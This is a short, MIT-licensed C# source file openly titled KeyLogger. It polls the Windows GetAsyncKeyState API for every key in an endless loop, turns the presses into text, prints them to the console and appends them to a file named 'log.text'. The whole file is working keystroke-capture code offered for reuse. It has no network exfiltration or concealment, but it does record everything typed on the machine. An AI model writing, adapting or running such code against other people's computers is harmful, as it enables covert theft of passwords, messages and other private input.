/* KeyLogger
 * 
 * Copyright (c) 2019 henkje
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 */

using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace KeyLogger
{
    class Program
    {
        //Delay, used when no key is pressed
        const short Delay = 50;

        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(int vKey);
        private static string key = string.Empty;

        static void Main()
        {
            int keys = Enum.GetValues(typeof(Keys)).Length;//Get the length of avaible keys.

            while (true)
            {
                for (int i = 0; i < keys; i++)//Loop every key.
                    if (GetAsyncKeyState(i) == -32767)//Check if key is pressed.
                        key += Enum.GetName(typeof(Keys), i);//Add key as string to _Keys.

                //If no key is pressed, wait x milliseconds.
                if (key.Length <= 0) { Task.Delay(Delay).Wait(); continue; }

                //Key is pressed, continue.
                //Ingenore LButton and RButton, these are mouse clicks.
                if (key.Equals("LButton")) { key = string.Empty; continue; }
                if (key.Equals("RButton")) { key = string.Empty; continue; }

                key = key.Replace("Enter", Environment.NewLine);//Replace Enter for a new line.
                key = key.Replace("Space", " ");//Replace Space for a real space.

                Console.WriteLine(key);
                File.AppendAllText("log.text", key);//Write key to file.
                key = string.Empty;//clear key.
            }
        }
    }
}
